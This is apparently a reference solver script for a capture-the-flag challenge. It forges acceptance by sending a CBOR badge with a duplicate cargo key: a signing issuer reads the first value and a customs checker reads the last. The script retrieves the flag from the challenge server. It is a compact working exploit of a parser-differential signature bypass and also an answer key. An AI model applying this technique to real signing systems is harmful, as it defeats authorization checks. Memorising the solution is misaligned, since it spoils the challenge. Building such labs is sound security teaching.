#!/usr/bin/env python3
"""C17 full reference solver — proves solvability from player-visible data only.

The issuer decodes a badge FIRST-wins and refuses forbidden cargo; customs decodes
the SAME signed bytes LAST-wins. Craft a CBOR map with a duplicate cargo key:
harmless first (so the issuer signs it), the forbidden target last (so customs
admits it). Get it signed, present it to customs, take the flag.
"""
import json
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
sys.path.insert(0, os.path.join(ROOT, "src", "lib"))
sys.path.insert(0, os.path.join(ROOT, "player", "client"))
import cbor                     # noqa: E402
from client import Client        # noqa: E402


def solve_once(host, port, verbose=True):
    def log(*a):
        if verbose:
            print(*a, flush=True)

    c = Client(host, port)
    info = c.info()
    harmless = info["allowed_cargo"][0]
    target = info["forbidden_target_cargo"]
    log(f"[*] issuer allows {info['allowed_cargo']}; forbidden target = {target!r}")

    # duplicate cargo key (3): harmless first (issuer signs), target last (customs reads)
    badge = cbor.enc_map([(1, 1), (2, "captain-nemo"),
                          (3, harmless), (4, "manifest-001"), (3, target)])
    badge_hex = badge.hex()
    log(f"[*] issuer sees cargo={cbor.first_wins(badge)[3]!r}, "
        f"customs will see cargo={cbor.last_wins(badge)[3]!r}")

    issued = c.issue(badge_hex)
    log(f"[*] issue -> {issued.get('status')} (cargo_seen={issued.get('cargo_seen')!r})")
    if issued.get("status") != "signed":
        raise RuntimeError(f"issuer refused: {issued}")

    res = c.customs(badge_hex, issued["signature"])
    log(f"[*] customs -> {res.get('status')} (cargo={res.get('cargo')!r})")
    if "flag" in res:
        log(f"\n[+] FLAG: {res['flag']}")
        return res["flag"]
    raise RuntimeError(f"customs did not yield the flag: {res}")


def main():
    info = json.load(open(os.path.join(ROOT, "player", "samples", "instance_public.json")))
    try:
        solve_once(info["gateway_host"], info["gateway_port"], verbose=True)
        return 0
    except Exception as ex:
        print(f"[-] solve failed: {ex}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
